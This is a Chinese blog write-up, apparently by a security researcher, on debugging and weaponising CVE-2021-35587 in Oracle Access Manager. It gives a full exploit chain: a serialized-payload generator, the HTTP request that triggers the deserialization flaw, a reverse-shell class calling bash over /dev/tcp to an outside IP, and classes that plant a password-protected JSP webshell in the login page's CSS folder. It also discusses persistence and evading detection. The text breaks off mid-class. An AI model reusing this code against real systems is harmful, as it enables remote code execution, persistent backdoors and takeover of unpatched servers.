为了理清楚到底是defineClass的那个环节造成的报错，我本地写了个defineClass的demo并调试（名叫definecls），然后在这两种异常下断点，终于看到了更真相的一幕。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import java.util.Base64; import java.lang.ClassLoader; public class main extends ClassLoader { public static void main(String[] args) { System.out.println(\u0026#34;hi\u0026#34;); new main().df(); } public void df(){ String data=\u0026#34;yv66vgAAADQAOQoABwAlCAAmCAAnCgAoACkKACgAKgcANwcALAcALQcALgcALwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAQTHBlcnMvbmVvL3Rlc3QxOwEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEACkV4Y2VwdGlvbnMHADABABRnZXRSZW1vdGVDb25zdHJ1Y3RvcgEANygpTGNvbS90YW5nb3NvbC9pbnRlcm5hbC91dGlsL2ludm9rZS9SZW1vdGVDb25zdHJ1Y3RvcjsBABRzZXRSZW1vdGVDb25zdHJ1Y3RvcgEAOChMY29tL3Rhbmdvc29sL2ludGVybmFsL3V0aWwvaW52b2tlL1JlbW90ZUNvbnN0cnVjdG9yOylWAQARcmVtb3RlQ29uc3RydWN0b3IBADVMY29tL3Rhbmdvc29sL2ludGVybmFsL3V0aWwvaW52b2tlL1JlbW90ZUNvbnN0cnVjdG9yOwEAEXNldFNlcnZlckxvY2F0aW9uAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylWAQABcwEAAnMxBwAxAQARZ2V0U2VydmVyTG9jYXRpb24BACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBAAp0ZXN0MS5qYXZhDAALAAwBAARjYWxjAQAXdG91Y2ggL3RtcC9oYWNrZWRieWhjc2wHADIMADMANAwANQA2AQAOcGVycy9uZW8vdGVzdDEBABBqYXZhL2xhbmcvT2JqZWN0AQArY29tL3Rhbmdvc29sL2ludGVybmFsL3V0aWwvaW52b2tlL1JlbW90YWJsZQEALndlYmxvZ2ljL2NsdXN0ZXIvc2luZ2xldG9uL0NsdXN0ZXJNYXN0ZXJSZW1vdGUBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABhqYXZhL3JtaS9SZW1vdGVFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAvcGVycy9uZW8vdGVzdDEkOENFQUEwNTJDQTI2MjlFN0Q0QkFENjE5QjI5NDhGNTcBADFMcGVycy9uZW8vdGVzdDEkOENFQUEwNTJDQTI2MjlFN0Q0QkFENjE5QjI5NDhGNTc7ACEABgAHAAMACAAJAAoAAAAFAAEACwAMAAIADQAAAFcAAgACAAAAEyq3AAESAkwSA0y4AAQrtgAFV7EAAAACAA4AAAAWAAUAAAAPAAQAEAAHABEACgASABIAFAAPAAAAFgACAAAAEwAQADgAAAAHAAwAEgATAAEAFAAAAAQAAQAVAAEAFgAXAAEADQAAACwAAQABAAAAAgGwAAAAAgAOAAAABgABAAAAGQAPAAAADAABAAAAAgAQADgAAAABABgAGQABAA0AAAA1AAAAAgAAAAGxAAAAAgAOAAAABgABAAAAHwAPAAAAFgACAAAAAQAQADgAAAAAAAEAGgAbAAEAAQAcAB0AAgANAAAAPwAAAAMAAAABsQAAAAIADgAAAAYAAQAAACQADwAAACAAAwAAAAEAEAA4AAAAAAABAB4AEwABAAAAAQAfABMAAgAUAAAABAABACAAAQAhACIAAgANAAAANgABAAIAAAACAbAAAAACAA4AAAAGAAEAAAAoAA8AAAAWAAIAAAACABAAOAAAAAAAAgAeABMAAQAUAAAABAABACAAAQAjAAAAAgAk\u0026#34;; byte[] b= Base64.getDecoder().decode(data); Class\u0026lt;?\u0026gt; c= defineClass(\u0026#34;pers.neo.test1$8CEAA052CA2629E7D4BAD619B2948F57\u0026#34;,b,0,b.length); String cname=c.getClass().getName(); System.out.println(cname); } } defineClass:-1 ClassLoader(java.lang) 是native函数，进入后成功完成最外层操作，然后因为需要继续构造反序列化链，往里尝试寻找com.tangosol.internal.util.invoke.Remotable 类。\n如下图，三步走。\n使用 findLoadedClass(String) 看类是否已被加载。 使用父类加载器loadClass，没有父类加载器为null就用虚拟机内置加载器。 使用findClass寻找。 步骤一findLoadedClass失败\n步骤二的父类加载器依次是sun.misc.Launcher$AppClassLoader、 sun.misc.Launcher$ExtClassLoader 和null。\n步骤三findClass\n跟入，没有找到，抛出异常\n至此就完全解释了因为 Caused By: java.lang.ClassNotFoundException: com.tangosol.internal.util.invoke.Remotable 导致 java.lang.NoClassDefFoundError: com/tangosol/internal/util/invoke/Remotable 的问题了。\n但至于是为什么找不到Remotable，就是另一个需要再尝试回答的问题了。\n添加依赖后本地可成功defineClass 给上述demo的lib加上coherence.jar这个类之后报错变化了，缺少 weblogic.cluster.singleton.ClusterMaster 。再加上 wlfullclient.jar ，就OK了，成功define出这个类。\n使用arthas在服务端能找到Remotable 类 那就是说是因为服务端找不到这个类。可是我们可以看到 com.tangosol.internal.util.invoke.Remotable 这个类在oamms容器中有两处存在\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # cls=\u0026#34;com.tangosol.internal.util.invoke.Remotable\u0026#34; # grep -P \u0026#34;$cls|\\.jar\u0026#34; oamms_tree.txt |grep -P \u0026#34;$cls\u0026#34; -B1 /u01/oracle/coherence/lib/coherence.jar com/tangosol/internal/util/invoke/Remotable.class com/tangosol/internal/util/invoke/RemotableClassGenerator.class com/tangosol/internal/util/invoke/RemotableSupport.class -- /u01/oracle/idm/oam/server/lib/jmx/coherence.jar com/tangosol/internal/util/invoke/Remotable.class com/tangosol/internal/util/invoke/RemotableClassGenerator.class com/tangosol/internal/util/invoke/RemotableSupport.class # grep -P \u0026#34;$cls|\\.jar\u0026#34; oamms_tree.txt |grep -P \u0026#34;$cls\u0026#34; -B1 |grep jar |xargs -i{} docker exec oamms md5sum {} b28ee46b9b9bd5c24df3bfee10075ba4 /u01/oracle/coherence/lib/coherence.jar 7b30411369752fc711a257ea6fb7e3d1 /u01/oracle/idm/oam/server/lib/jmx/coherence.jar # grep -P \u0026#34;$cls|\\.jar\u0026#34; oamms_tree.txt |grep -P \u0026#34;$cls\u0026#34; -B1 |grep jar |xargs -i{} docker exec oamms ls -lS {} -rw-r----- 1 oracle oracle 13490976 Sep 12 2019 /u01/oracle/coherence/lib/coherence.jar -rw-r----- 1 oracle oracle 13490779 Sep 10 2019 /u01/oracle/idm/oam/server/lib/jmx/coherence.jar 在容器中使用 arthas 也是能找到类的\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 [arthas@181]$ sc *Remotable* com.tangosol.internal.util.invoke.Remotable com.tangosol.internal.util.invoke.RemotableSupport com.tangosol.internal.util.invoke.RemotableSupport$$Lambda$143/386686148 com.tangosol.internal.util.invoke.lambda.AbstractRemotableLambda Affect(row-cnt:4) cost in 360 ms. [arthas@181]$ sc -d com.tangosol.internal.util.invoke.Remotable class-info com.tangosol.internal.util.invoke.Remotable code-source /u01/oracle/coherence/lib/coherence.jar name com.tangosol.internal.util.invoke.Remotable isInterface true isAnnotation false isEnum false isAnonymousClass false isArray false isLocalClass false isMemberClass false isPrimitive false isSynthetic false simple-name Remotable modifier abstract,interface,public annotation interfaces com.tangosol.io.SerializationSupport super-class class-loader +-PolicyClassLoader \u0026#39;weblogic-launcher\u0026#39; @16267862 {file:/home/oracle/arthas/arthas-agent.jar file:/u01/oracle/wlserver/server/lib/weblogic-launcher.jar ... (798 more)} +-sun.misc.Launcher$AppClassLoader@18b4aac2 +-sun.misc.Launcher$ExtClassLoader@495ae1c3 classLoaderHash 16267862 class-info com.tangosol.internal.util.invoke.lambda.AbstractRemotableLambda code-source /u01/oracle/coherence/lib/coherence.jar name com.tangosol.internal.util.invoke.lambda.AbstractRemotableLambda isInterface false isAnnotation false isEnum false isAnonymousClass false isArray false isLocalClass false isMemberClass false isPrimitive false isSynthetic false simple-name AbstractRemotableLambda modifier abstract,public annotation interfaces com.tangosol.internal.util.invoke.Remotable,com.oracle.common.base.CanonicallyNamed,java.io.Serializable super-class +-java.lang.Object class-loader +-PolicyClassLoader \u0026#39;weblogic-launcher\u0026#39; @16267862 {file:/home/oracle/arthas/arthas-agent.jar file:/u01/oracle/wlserver/server/lib/weblogic-launcher.jar ... (798 more)} +-sun.misc.Launcher$AppClassLoader@18b4aac2 +-sun.misc.Launcher$ExtClassLoader@495ae1c3 classLoaderHash 16267862 Affect(row-cnt:2) cost in 79 ms. 但是为何类加载器就是找不到呢？实在费解。\n尝试使用arthas添加自定义类 此时的我有些懵，甚至怀疑是不是 pers.neo.test 类在服务端没有定义导致的，想尝试使用arthas添加一个类。\n经过搜索，发现 retransform 命令可以做到，但尝试了没有成功，报错\n1 2 3 4 5 6 7 8 [arthas@181]$ sc *pers.neo* Affect(row-cnt:0) cost in 30 ms. [arthas@181]$ [arthas@181]$ retransform /tmp/test.class These classes are not found in the JVM and may not be loaded: [pers.neo.test] [arthas@181]$ [arthas@181]$ sc *pers.neo* Affect(row-cnt:0) cost in 29 ms. 文档说是有限制\n1 2 New field/method is not allowed The function that is running, no exit can not take effect, such as the new System.out.println added below, only the run() function will take effect. 转念想到既然在本地，在依赖库齐全的情况下，不需要pers.neo.test类也是可以完成反序列化的，说明序列化数据中已经包含了所有需要的信息，顺利的情况下通过字节码足以完全还原 pers.neo.test 类了。\n本地远程demo对比 在 weblogic.utils.classloaders.ChangeAwareClassLoader#findClass 下断点\n本地是能找到这个interface的\n远程的会报错\n虽然不知道为何如此，但事实就是如此，远程的classloader找不到这个类。\n尝试调试oamms容器中的defineClass过程 既然本地成功了，而远程不行，加上网上有人认为defineclass出错可能是version不对，只好再硬着头皮仔细调试oamms容器中那个进进出出native层的defineClass过程。\n在 com.tangosol.internal.util.invoke.RemotableSupport#defineClass 下断点跟进。\n比对abClass数组是否一致：一致 环境中的defination\n生成payload时候的defination\n看起来是一模一样的。取出其中的 oamms反序列化时的 definition.m_abClass和 生成payload时的constructor.m_definition.m_abClass，他们俩都是1545字节长，但直接计算.hashCode值不同。计算哈希值比较。\n通过evaluate执行\n1 2 new java.math.BigInteger(1,java.security.MessageDigest.getInstance(\u0026#34;MD5\u0026#34;).digest(constructor.m_definition.m_abClass)).toString(16) new java.math.BigInteger(1,java.security.MessageDigest.getInstance(\u0026#34;MD5\u0026#34;).digest(abClass)).toString(16) 前者都是bce0f353100a294f763a2d72e6a91ff9，是一样的。\n★没有将字节码写到磁盘中，但存在跨路径写文件 com.tangosol.internal.util.invoke.RemotableSupport#defineClass\n这里的DUMP_REMOTABLE配置来自于 coherence.server.remotable.dumpClasses ，是null。\n如果非空的话，会把它作为目录将我们的字节码写入该目录下的class文件中。\n因为 coherence.server.remotable.dumpClasses 没有专门配置目录\n所以跳过了 com.tangosol.internal.util.invoke.ClassDefinition#dumpClass 写class文件的逻辑。\n但如果进入这个逻辑，这里是可以向任意路径写任意内容文件的。\n进入defineClass 然后就来到了非常梦幻且重要的地方\n失败就发生在这个方法里面\npreDefinaClass和defineClassSourceLocation都正常\n然后到了native， java.lang.ClassLoader#defineClass1\n马上又出来到了 rt.jar的 sun.instrument.InstrumentationImpl#transform\n进到 sun.instrument.TransformerManager#transform\ntransform失败，返回null，为什么呢？类名和bytecode都有了，为什么会transform失败呢？transform究竟发生了什么呢？\ntransform返回前的调用栈是这样的\nF7步进之后变成了\n继续F7就来到了AttributeHolder的反序列化过程，一个奇怪的地方，一定是已经跳过了一些其他逻辑，idea没有严格步进。\njump into rabbit hole 我们需要知道，transform 返回 null之后，attributeHolder报错之前，发生了什么？但native层和Java层的反复横跳实在难以跟踪。\n在 com.tangosol.internal.util.invoke.RemotableSupport#defineClass 下断点\n再根据错误堆栈在classloader的几个地方下断点\n分别是在ClassLoader.java的351、418、523行下断点\n在transform 返回一个null的var7之后按F7步进\n果然来到了rabbithole，也就是classLoader的351行\n这个loadClass 是属于 /root/cwd/cveplay/cve-2021-35587/weblogiclib/coherence.jar 里面的com/tangosol/internal/util/invoke/RemotableSupport.class的，因为它extend了ClassLoader\n仔细观察RemotableSupport对象。里面甚至有我们之前尝试加载的类，这是怎么回事呢？不清楚，暂时放着。\n这个loadClass在尝试加载 com.tangosol.internal.util.invoke.Remotable类\n尝试关闭smart step into，之后再f7，还是没有用，又来到了AttributeHolder报错的地方，这不是我想看到的。\n从transform再开始 到loadClass\n手动进入函数定义下断点，再步进，看到是因为 com/tangosol/internal/util/invoke/RemotableSupport.class 调用findLoadedClass寻找com.tangosol.internal.util.invoke.Remotable时返回了null。\n或许，这里，就是整个报错的根因了。\n柳暗花明 现象是理解了，但是，为什么这个classLoader找不到这个明明存在的类呢？虽然这不是一个类，是一个接口，但也应该被加载了啊。\n看报错调用栈第十六行也是 RemotableSupport (com.tangosol.internal.util.invoke) 这个对象调用 defineClass 去寻找 com.tangosol.internal.util.invoke.Remotable 时出错，而 RemotableSupport 和 Remotable ` ，明明在同一个包底下，为何一个类能正常执行，却找不到同一个包下的另一个类呢？\n多方折腾之后，终于接受了服务端找不到Remotable这个事实。我沉思良久，终于问出那个问题——那么究竟是为什么我反序列化自己的test类却要去找Remotable类呢？\n答案就是：因为我的test6定义里面实现了这个接口。\n我为什么实现这个接口呢？因为在利用CVE-2020-14644的时候必须实现这个接口。那么现在呢？不实现可以吗？\n重新尝试使用一个不实现Remotable接口的test6类进行调试，参考调用栈添加一个断点com.tangosol.internal.util.invoke.RemoteConstructor#readResolve。\n一路跟进反射来到了一个奇怪的地方：\n虽然不知道自己在哪里，但是看到了calc 和 touch，说明静态代码被执行了。\n从pers.neo.test6执行到了getRuntime\n执行到了exec\n切割 token\n一路跟进exec直到java.lang.UNIXProcess\n然后执行的native的forkAndExec\n改变test6中的命令为 touch /tmp/hackedbyneo，成功执行命令：\n就是说去掉 implements Remotable就可以了，那么是不是ClusterMasterRemote也不用实现。确实如此。\n其实，Serializable接口也不需要。\nFrom CVE-2020-14644 to CVE-2021-35587 总的来说，将自定义的恶意类从\n1 public class test7 implements Remotable, ClusterMasterRemote, Serializable {} 改为\n1 public class test7 implements Serializable {} 就解决了最后的障碍。\n很长一段时间，因为Remotable没有找到而迟迟无法成功利用漏洞。差之毫厘，谬之千里，正是此意。\n至此我们就完成了利用CVE-2021-35587这个漏洞从反序列化入口到恶意类静态代码执行的全过程。\n下面看一下如何在真实环境中采用各种姿势利用这个漏洞获取主机控制权限。\n漏洞利用 新建生成PoC的工程 在idea中新建一个名为wlsgadget的maven工程。\n为了操作字节码，在pom.xml中添加javassist。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;project xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;groupId\u0026gt;org.example\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;wlsgadget\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0-SNAPSHOT\u0026lt;/version\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.javassist\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javassist\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.20.0-GA\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/project\u0026gt; 为了顺利生成PoC，还需要在library中添加 ”远程调试OAM -\u0026gt; ⑤下载依赖包到调试主机“ 中提到的oraclelib、wlfullclient、coherencelib三个依赖。\ngenpoc.java：漏洞利用框架 genpoc.java用basicServiceContext的对象包裹一条已知的weblogic利用链（CVE-2021-14644）。\ncve_2021_35587()方法的输入是一个我们构造的恶意类，如rev.class，输出是可以用于触发漏洞的requester参数值，即以下请求报文中的xxxx部分。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 POST /oam/server/opensso/sessionservice HTTP/1.1 Host: 192.168.175.139:14100 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: text/xml Content-Length: 289 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;RequestSet vers=\u0026#34;vers123\u0026#34; svcid=\u0026#34;session\u0026#34; reqid=\u0026#34;req_1\u0026#34;\u0026gt; \u0026lt;Request dtdid=\u0026#34;dtd1\u0026#34; sid=\u0026#34;sid1\u0026#34;\u0026gt;\u0026lt;![CDATA[ \u0026lt;authIdentifier reqid=\u0026#34;1\u0026#34; requester=\u0026#34;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\u0026#34;\u0026gt; \u0026lt;SessionID\u0026gt;123\u0026lt;/SessionID\u0026gt; \u0026lt;/authIdentifier\u0026gt; ]]\u0026gt; \u0026lt;/Request\u0026gt; \u0026lt;/RequestSet\u0026gt; 其中作为参数传入cve_2021_35587()方法的类即用于在反序列化的最终环节构建恶意对象，我们在诸如rev.class这样的恶意类的构造函数中执行恶意代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package pers.neo; import com.tangosol.coherence.servlet.AttributeHolder; import com.tangosol.internal.util.invoke.ClassDefinition; import com.tangosol.internal.util.invoke.ClassIdentity; import com.tangosol.internal.util.invoke.RemoteConstructor; import javassist.ClassPool; import javassist.CtClass; import oracle.security.am.proxy.opensso.session.utils.SessionID; import weblogic.rmi.provider.BasicServiceContext; import java.io.*; import java.lang.reflect.Method; import java.nio.charset.StandardCharsets; import java.util.Base64; public class genpoc{ public static void main(String[] args) throws Exception { cve_2021_35587(rev.class); } public static void cve_2021_35587(Class poccls) throws Exception { ClassIdentity classIdentity = new ClassIdentity(poccls); ClassPool cp = ClassPool.getDefault(); CtClass ctClass = cp.get(poccls.getName()); ctClass.replaceClassName(poccls.getName(), poccls.getName() + \u0026#34;$\u0026#34; + classIdentity.getVersion()); RemoteConstructor constructor = new RemoteConstructor( new ClassDefinition(classIdentity, ctClass.toBytecode()), new Object[]{} ); //这一环并非必要，可以简化 //AttributeHolder attributeHolder=new AttributeHolder(); //Method setInternalValue=attributeHolder.getClass().getDeclaredMethod(\u0026#34;setInternalValue\u0026#34;,Object.class); //setInternalValue.setAccessible(true); //setInternalValue.invoke(attributeHolder,constructor); //BasicServiceContext basicServiceContext=new BasicServiceContext(1,attributeHolder); //直接将constructor设置到basicServiceContext中 BasicServiceContext basicServiceContext=new BasicServiceContext(1,constructor); System.out.println(oamserialize(basicServiceContext)); } public static \u0026lt;T extends Serializable\u0026gt; String oamserialize(T item) { String data=serialize(item); return Base64.getEncoder().encodeToString((\u0026#34;object:\u0026#34;+data).getBytes(StandardCharsets.UTF_8)); } // ref: https://gist.github.com/andy722/1524968 public static \u0026lt;T extends Serializable\u0026gt; String serialize(T item) { final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); final ObjectOutputStream objectOutputStream; try { objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(item); objectOutputStream.close(); return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()); } catch (IOException e) { throw new Error(e); } } } rev.java：反弹shell 优缺点 优点：\n可以获得一个shell。视觉冲击强，互操作性强。 成功率高。由恶意类代码简单，只要反序列化成功了就能执行到恶意代码，不存在像内存马那样需要复杂的、版本相关的获取各种对象的过程，不确定因素较少。 缺点：\n多数情况下只能反弹到内网。必须在服务端网络可达的地方接收shell，大多数情况下这意味着攻击者的网络位置需要在内网。 持久化效果一般。一个请求只能获得一个shell，反弹的shell还容易超时，一直保持的网络连接也容易引起运维人员的警觉。 最终效果 1 2 3 4 5 6 7 8 9 10 11 12 13 14 package pers.neo; import java.io.*; public class rev{ // ref: https://www.jianshu.com/p/ae3922db1f70 public rev(){ String[] cmdarray=new String[]{\u0026#34;bash\u0026#34;,\u0026#34;-c\u0026#34;,\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/172.18.0.1/2345 0\u0026gt;\u0026amp;1\u0026#34;}; try { Runtime.getRuntime().exec(cmdarray); } catch (IOException e) { e.printStackTrace(); } } } wjsp.java：遍历目录写jsp木马 探索过程 访问本地OAM的主页发现有一处静态文件 http://192.168.175.139:14100/oam/pages/css/login_page.css ，如果我们能在 /page/css/ 路径下放一个jsp文件，那么就能得到一个webshell。\n在OAM容器中寻找login_page.css发现有两处（正常情况下应该只有一处，因为这里我重启过容器，所以有多处）：\n可以看到其路径是 /u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam_server/xrd2uw/war/pages/css/login_page.css ，其中存在随机字符串 xrd2uw 和 hukic2 。\n尝试往目录中写入jsp文件，可以成功执行。\n（有些奇怪的是，直接在磁盘上面创建的CSS文件可以被访问，直接在磁盘上面创建的JSP文件却不能被解析和访问，只有通过反序列化写进去的jsp文件才能够被解析和执行，这一度导致我认为往这个目录写jsp行不通。）\n（只有第一次写能生效，重写jsp文件内容的话，因为已经编译成class了，所以修改的内容不会生效。）\n那么问题的难点就变成了如何通过Java代码找到css所在的目录，因为我们不知道目标主机的部署路径中的随机字符串。\n这时很自然地会问一个问题，当我执行反序列化的时候，我所在工作目录是什么呢，是否可以通过相对路径去写jsp？\n通过以下方式获取命令执行的结果，查看执行反序列化时所在的工作目录。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package pers.neo; import java.io.*; public class sayhi{ public sayhi(){ String cmd=\u0026#34;pwd\u0026#34;; String result=\u0026#34;/tmp/cve/result.txt\u0026#34;; try { PrintWriter out = new PrintWriter(result); out.println(execCmd(cmd)); out.close(); } catch (IOException e) { throw new RuntimeException(e); } } public static String execCmd(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; } } 结果：\n至此可以确认工作目录是 /u01/oracle/user_projects/domains/access_domain 。那么只要反序列化时在当前目录下面遍历搜索找到 login_page.css 文件，并在同目录下写入neo.jsp文件就可以通过 http://192.168.175.139:14100/oam/pages/css/neo.jsp 解析并执行了。\n遍历搜索的方式总归不够优雅，如果出现像我本地实例上那样存在多个部署目录的情况就可能写下多余的文件，我们通过黑盒也不会知道自己的代码究竟在哪些地方写下的文件。\n于是继续探索，是否有什么方式可能通过配置文件或者从当前JVM中获取静态文件所在目录呢？随后发现 System.getProperties() 可以得到很多属性，其中是否有我们关心的目录呢？\n经过一番观察，发现通过 oracle.deployed.app.dir 可以得到部署目录：\n1 oracle.deployed.app.dir=/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user 前进了一步，要搜索的文件夹从 /u01/oracle/user_projects/domains/access_domain 变成了 /u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user ，\n距离完整路径 /u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam_server/xrd2uw/war/pages/css/login_page.css 还差 oam_server/xrd2uw/ 这一段是未知的。\n但至此已经可以勉强实现一种方案了。\n优缺点 优点\n只需要触发一次漏洞便可得到持久的webshell，动作较小。 重启机器webshell仍然存在。 缺点：\n有文件落地，可能引起HIDS告警。 最终效果 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 package pers.neo; import java.io.*; public class wjsp implements Serializable { public wjsp(){ // String deploydir=\u0026#34;/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user\u0026#34;; // String deploydir=\u0026#34;/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam_server/xrd2uw/war/pages/css\u0026#34;; String deploydir=System.getProperty(\u0026#34;oracle.deployed.app.dir\u0026#34;); loop(new File(deploydir)); } public void loop(File dir){ for(File file:dir.listFiles()){ if(file.isFile()){ if(file.getAbsolutePath().endsWith(\u0026#34;login_page.css\u0026#34;)){w(file);} }else if(file.isDirectory()){ loop(file.getAbsoluteFile()); } } } public void w(File file){ File fjsp=new File(file.getParent(),\u0026#34;clickjackingScriptbakup_9ik97.jsp\u0026#34;); PrintWriter writer = null; try { writer = new PrintWriter(fjsp.getAbsoluteFile(), \u0026#34;UTF-8\u0026#34;); } catch (Exception e) { throw new RuntimeException(e); } // String jsp=\u0026#34;\u0026lt;% if(\\\u0026#34;p4ssw0rd!\\\u0026#34;.equals(request.getParameter(\\\u0026#34;pwd\\\u0026#34;))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\\\u0026#34;i\\\u0026#34;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\\\u0026#34;\u0026lt;pre\u0026gt;\\\u0026#34;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\\\u0026#34;\u0026lt;/pre\u0026gt;\\\u0026#34;); } %\u0026gt;\u0026#34;; //betterjsp String jsp=\u0026#34;\u0026lt;% if(\\\u0026#34;p4ssw0rd!\\\u0026#34;.equals(request.getHeader(\\\u0026#34;x-forwarded-fur\\\u0026#34;))){ java.io.InputStream in = Runtime.getRuntime().exec(new String[]{\\\u0026#34;bash\\\u0026#34;,\\\u0026#34;-c\\\u0026#34;,request.getHeader(\\\u0026#34;x-forwarded-far\\\u0026#34;)}).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\\\u0026#34;\u0026lt;pre\u0026gt;\\\u0026#34;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\\\u0026#34;\u0026lt;/pre\u0026gt;\\\u0026#34;); } %\u0026gt;\u0026#34;; writer.println(jsp); writer.close(); } } wjspx.java：遍历目录卸载jsp木马 注意点 可以模拟wjsp.java的做法删除磁盘上的文件，但需要注意：\n如果在删除文件前访问过webshell，jsp文件就已经转成class，路由也添加了。那么在删除文件只是从磁盘上面删除jsp而已，后门还是可以访问的。 重新上传同名但是内容不同的jsp文件，并不会再编译一次去覆盖已有的class，也就是说无法更新webshell的功能或者密码。 最终效果 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package pers.neo; import java.io.*; public class wjspx { public wjspx(){ String deploydir=System.getProperty(\u0026#34;oracle.deployed.app.dir\u0026#34;); loop(new File(deploydir)); } public void loop(File dir){ for(File file:dir.listFiles()){ if(file.isFile()){ if(file.getAbsolutePath().endsWith(\u0026#34;/war/pages/css/hineo2.jsp\u0026#34;)){file.delete();} }else if(file.isDirectory()){ loop(file.getAbsoluteFile()); } } } } wjsp2.java：精准定位临时目录写jsp木马 探索过程 在探索实现 wjsp.java 时我们提到，还有 oam_server/xrd2uw/ 这一段路径是未知的。\n在学习编写内存马的过程中我发现通过当前请求的上下文可以得到这一段路径。那么拼接起来就可以得到完整的css路径，精准写入目标文件夹了。\n可以通过 getTempPath() 精准定位到临时目录的位置是 oam_server/xrd2uw\n加上System.getProperty(\u0026quot;oracle.deployed.app.dir\u0026quot;) 获取到的 \u0026quot;/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user\u0026quot;\n拼接起来，就能精准得到路径 \u0026quot;/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam_server/xrd2uw/war/pages/css\u0026quot;\n非常完美，避免了wjsp.java里面那种不优雅的到处写jsp的方法。\n优缺点 优点\n可以精准往想要的未知写入jsp文件，避免了因为部署差异导致失败 缺点\n存在环境不确定性，可能因为不同版本代码写法不同导致获取不到request对象 最终效果 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 package pers.neo; import weblogic.servlet.internal.HttpConnectionHandler; import weblogic.servlet.provider.ContainerSupportProviderImpl; import weblogic.work.ExecuteThread; import java.io.*; public class wjsp2{ public wjsp2(){ String deploydir=System.getProperty(\u0026#34;oracle.deployed.app.dir\u0026#34;); java.lang.reflect.Field field = null; HttpConnectionHandler httpConn = null; try { ContainerSupportProviderImpl.WlsRequestExecutor gcw = (ContainerSupportProviderImpl.WlsRequestExecutor) ((ExecuteThread) 